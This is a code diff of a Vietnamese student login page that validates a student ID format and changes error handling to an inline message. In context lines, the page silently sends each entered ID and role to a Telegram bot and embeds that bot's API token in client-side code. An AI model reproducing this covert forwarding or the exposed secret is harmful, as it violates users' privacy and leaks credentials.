@@ -92,6 +92,13 @@
       cursor: pointer;
     }
 
+    .error-message {
+      color: red;
+      font-weight: bold;
+      text-align: center;
+      margin-top: 10px;
+    }
+
     .footer {
       background-color: #035e96;
       color: white;
@@ -167,6 +174,8 @@
       <div class="submit-btn">
         <button type="submit">Đăng nhập</button>
       </div>
+
+      <div id="error-message" class="error-message"></div>
     </form>
   </div>
 
@@ -190,14 +199,16 @@
 
       const username = document.getElementById("username").value.trim().toUpperCase();
       const role = document.querySelector("input[name='role']:checked").value;
+      const errorDiv = document.getElementById("error-message");
 
-      // Kiểm tra MSSV định dạng: K16THO00 + 2 chữ số
       const pattern = /^K16THO00\d{2}$/;
       if (!pattern.test(username)) {
-        alert("❌ MSSV không hợp lệ. Bạn sẽ được chuyển hướng.");
-        window.location.href = "https://www.google.com";
+        errorDiv.textContent = "❌ MSSV không hợp lệ. Vui lòng nhập theo định dạng: Nhập MSSV Có Trên Thẻ Sinh Viên";
         return;
       }
+
+      // Xóa thông báo lỗi nếu đúng
+      errorDiv.textContent = "";
 
       const message = `🛡️ Đăng nhập mới:\n👤 MSSV: ${username}\n🔐 Vai trò: ${role}`;
       const token = "7393833255:AAEHbjSRIky-AFJNFCXqfdfMv7UHWla_T3s";
@@ -211,22 +222,12 @@
         if (response.ok) {
           window.location.href = `tc.html?mssv=${encodeURIComponent(username)}`;
         } else {
-          alert("⚠️ Lỗi khi gửi thông tin đến Telegram.");
+          errorDiv.textContent = "⚠️ Lỗi khi gửi thông tin đến Telegram.";
         }
       }).catch(err => {
         console.error("Telegram Error:", err);
-        alert("❌ Không thể gửi dữ liệu đến Telegram.");
+        errorDiv.textContent = "❌ Không thể gửi dữ liệu đến Telegram.";
       });
-    });
-
-    document.addEventListener("DOMContentLoaded", () => {
-      const params = new URLSearchParams(window.location.search);
-      const mssv = params.get("mssv");
-      if (mssv) {
-        document.querySelectorAll('a[href="index.html"]').forEach(link => {
-          link.href = `index.html?mssv=${encodeURIComponent(mssv)}`;
-        });
-      }
     });
   </script>
 </body>
